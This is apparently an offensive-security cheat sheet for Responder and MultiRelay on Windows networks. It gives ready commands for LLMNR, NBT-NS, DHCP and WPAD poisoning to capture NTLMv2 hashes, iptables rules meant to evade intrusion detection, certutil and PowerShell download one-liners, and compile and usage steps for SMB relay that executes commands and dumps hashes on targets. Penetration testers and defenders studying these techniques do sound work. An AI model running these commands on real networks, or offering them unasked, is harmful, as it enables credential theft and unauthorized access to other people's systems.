# Usage

Search Tag(s): #mitm #responder #smb #relay #ntlm

## 01 - Responder

### 1.1 - Help Menu

```
$ responder -h  
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

Usage: responder -I eth0 -w -d
or:
responder -I eth0 -wd

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
                        BROWSER, LLMNR requests without responding.
  -I eth0, --interface=eth0
                        Network interface to use, you can use 'ALL' as a
                        wildcard for all interfaces
  -i 10.0.0.21, --ip=10.0.0.21
                        Local IP to use (only for OSX)
  -6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
                        Poison all requests with another IPv6 address than
                        Responder's one.
  -e 10.0.0.22, --externalip=10.0.0.22
                        Poison all requests with another IP address than
                        Responder's one.
  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
  -d, --DHCP            Enable answers for DHCP broadcast requests. This
                        option will inject a WPAD server in the DHCP response.
                        Default: False
  -D, --DHCP-DNS        This option will inject a DNS server in the DHCP
                        response, otherwise a WPAD server will be added.
                        Default: False
  -w, --wpad            Start the WPAD rogue proxy server. Default value is
                        False
  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                        Upstream HTTP proxy used by the rogue WPAD Proxy for
                        outgoing requests (format: host:port)
  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default:
                        False
  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
                        authentication for the proxy. WPAD doesn't need to be
                        ON. This option is highly effective. Default: False
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
  --disable-ess         Force ESS downgrade. Default: False
  -v, --verbose         Increase verbosity.
```

### 1.2 - Basics

#### 1.2.1 - LLMNR

- NBT-NS and LLMNR Poisoning via capturing NTLMv2-SSP hashes

`$ sudo responder -I <interface> -rdwv`

- LLMNR Poisoning

`$ sudo responder -I eth0 --lm -v`

#### 1.2.2 - DHCP

- DHCP and WPAD poisoning

When a windows host requires a new IP address dynamically it can perform HTTP WPAD poisoning response while the user uses a web browser that contains auto proxy settings enabled

`$ sudo responder -I <interface> -Pdwv`

#### 1.2.3 - WebDAV

- Block SMB traffic on the attacker's machine to poison NTLMv2-SSP responses via WebDAV/HTTP

Note: You don't have to block the ports unless you're evading some IDS to identify you for performing MITM poisoning

```
$ sudo iptables -A INPUT -p udp --dport 137 -j DROP
$ sudo iptables -A INPUT -p udp --dport 138 -j DROP
$ sudo iptables -A INPUT -p tcp --dport 139 -j DROP
$ sudo iptables -A INPUT -p tcp --dport 445 -j DROP
```

`$ sudo responder -I eth1 -Pdv`

`C:\> certutil -urlcache -split -f https://google.com file.txt`

`PS C:\> Invoke-WebRequest -Uri https://google.com -OutFile file.txt`

## 02 - MultiRelay

TODO: Fill this info

### 2.1 - Compile Binaries

```
$ cd /usr/share/responder/tools/ &&
sudo x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv && \
sudo x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode
```

### 2.2 - Help Menu

```
$ ./MultiRelay.py -h
Usage: 
responder-MultiRelay -t 10.20.30.40 -u Administrator lgandx admin
responder-MultiRelay -t 10.20.30.40 -u ALL

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -t 10.20.30.45        Target server for SMB relay.
  -p 8081               Additional port to listen on, this will relay for
                        proxy, http and webdav incoming packets.
  -u, --UserToRelay     Users to relay. Use '-u ALL' to relay all users.
  -c whoami, --command=whoami
                        Single command to run (scripting)
  -d, --dump            Dump hashes (scripting)
```

### 2.3 - Usage

`$ sudo MultiRelay.py -t <target_IP> -u <username_1> <username_2> <username_n>`

---
## References

- [Responder](https://github.com/lgandx/Responder)

- [Hacktricks: Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks)

- [Responders DHCP Poisoner](https://g-laurent.blogspot.com/2021/08/responders-dhcp-poisoner.html)

- [Understanding UNC Paths SMB And WebDAV](https://www.n00py.io/2019/06/understanding-unc-paths-smb-and-webdav/)

- [The Dangers of Endpoint Discovery in Vipre Endpoint Security](https://www.n00py.io/2020/12/the-dangers-of-endpoint-discovery-in-vipre-endpoint-security/)

- [Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)

- [Using A SCF File to Gather Hashes](https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/)

- [DMCXBLUE: Capturing Hashes](https://dmcxblue.net/2020/06/17/capturing-hashes/)

- [SMB HTTP Auth Capture va SCF](https://room362.com/post/2016/smb-http-auth-capture-via-scf/)

- [A Detailed Guide on Responder LLMNR Poisoning](https://www.hackingarticles.in/a-detailed-guide-on-responder-llmnr-poisoning/)